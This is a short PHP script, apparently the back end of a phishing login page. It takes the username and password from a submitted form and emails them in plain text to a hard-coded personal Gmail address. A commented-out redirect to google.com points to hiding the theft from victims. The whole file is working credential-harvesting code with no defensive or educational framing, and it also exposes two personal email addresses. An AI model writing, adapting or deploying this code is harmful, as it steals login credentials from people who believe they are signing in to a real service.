<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST["usuario"];
    $contraseña = $_POST["contraseña"];
    $to = "yosephnoe29@gmail.com";
    $asunto = "Inicio de sesión - Datos de usuario";
    $mensaje = "Usuario: $usuario\nContraseña: $contraseña";
    $headers="From: yosfrank29@gmail.com";

    if (mail($to, $asunto, $mensaje,$headers)) {
        //header("Location: https://www.google.com");
    echo"Se envio el correo";
    } else {
        echo "Hubo un error al enviar el correo electrónico.";
    }
}
?>
